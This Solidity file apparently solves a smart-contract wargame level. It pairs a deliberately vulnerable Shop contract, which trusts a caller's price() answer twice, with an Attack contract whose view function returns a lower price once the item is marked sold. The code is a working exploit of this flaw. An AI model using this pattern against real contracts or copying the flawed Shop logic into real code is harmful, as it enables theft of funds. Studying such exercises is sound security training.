pragma solidity ^0.8;

interface IShop {
    function buy() external;

    function price() external view returns (uint256);

    function isSold() external view returns (bool);
}

interface Buyer {
    function price() external view returns (uint);
}

contract Attack {
    IShop private immutable target;

    constructor(address _target) {
        target = IShop(_target);
    }

    function attack() external {
        target.buy();
        require(target.price() == 10, "price != 10");
    }

    function price() external view returns (uint256) {
        if (target.isSold()) {
            return 10;
        }
        return 100;
    }
}

contract Shop {
    uint public price = 100;
    bool public isSold;

    function buy() public {
        Buyer _buyer = Buyer(msg.sender);

        if (_buyer.price() >= price && !isSold) {
            isSold = true;
            price = _buyer.price();
        }
    }
}
